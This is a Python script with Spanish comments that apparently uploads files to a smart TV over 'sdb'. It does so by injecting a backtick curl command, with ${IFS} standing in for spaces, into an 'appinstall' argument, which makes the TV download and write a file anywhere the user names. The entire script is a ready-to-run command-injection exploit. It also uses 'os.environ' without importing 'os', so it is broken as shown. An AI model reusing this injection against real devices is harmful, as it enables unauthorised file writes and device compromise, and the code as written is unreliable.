#!/usr/bin/env python3
"""
tv-upload.py — sube un fichero binario a la TV vía curl fetch del propio TV.
Uso: tv-upload.py <fichero> <destino-en-TV> [timeout]
El TV hace curl GET a /in y guarda el cuerpo en el destino.
"""
import socket, socketserver, subprocess, sys, threading, http.server
from pathlib import Path

TV_IP = os.environ.get("ARN0_TV_IP", "192.168.1.128")  # export ARN0_TV_IP=<tu TV>
SDB = str(Path(__file__).resolve().parent / "sdb-run.sh")
SERIAL = "host.docker.internal:26101"

def main():
    src = Path(sys.argv[1]).resolve()
    dest = sys.argv[2]
    timeout = int(sys.argv[3]) if len(sys.argv) > 3 else 30
    data = src.read_bytes()
    served = threading.Event()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as rt:
        rt.connect((TV_IP, 9)); local = rt.getsockname()[0]

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.endswith("/in") and not served.is_set():
                self.send_response(200)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                self.wfile.flush()
                served.set()
            else:
                self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
        def log_message(self, *a): pass

    socketserver.ThreadingTCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer((local, 0), H) as srv:
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        url = f"http://{local}:{port}/in"
        argument = f"0 appinstall tpk new2.tpk`curl${{IFS}}-s${{IFS}}{url}${{IFS}}-o${{IFS}}{dest}`.tpk"
        proc = subprocess.run([SDB, "-s", SERIAL, "shell", argument],
                              capture_output=True, text=True, timeout=timeout)
        got = served.wait(10)
        import time as _t; _t.sleep(0.5)
        srv.shutdown()
        if not got:
            sys.exit(f"SIN FETCH para {dest}")
        print(f"ok: {src.name} -> {dest} ({len(data)}B servidos)")

if __name__ == "__main__":
    main()
